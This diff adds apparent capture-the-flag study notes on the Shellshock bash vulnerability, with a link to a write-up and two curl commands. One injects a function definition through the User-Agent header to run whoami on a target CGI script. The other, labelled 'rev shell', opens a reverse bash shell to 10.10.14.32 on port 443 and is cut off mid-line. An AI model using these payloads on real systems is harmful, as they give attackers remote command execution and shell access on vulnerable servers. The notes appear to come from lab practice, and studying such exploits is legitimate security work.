@@ -1,0 +1,7 @@
+shellshock
+
+https://muirlandoracle.co.uk/2020/09/03/0day-writeup/
+
+curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;" http://<MACHINE-IP>/cgi-bin/test.cgi
+rev shell
+curl -H 'User-Agent: `() { :;}; bash -i >& /dev/tcp/10.10.14.32/443 0>&1`
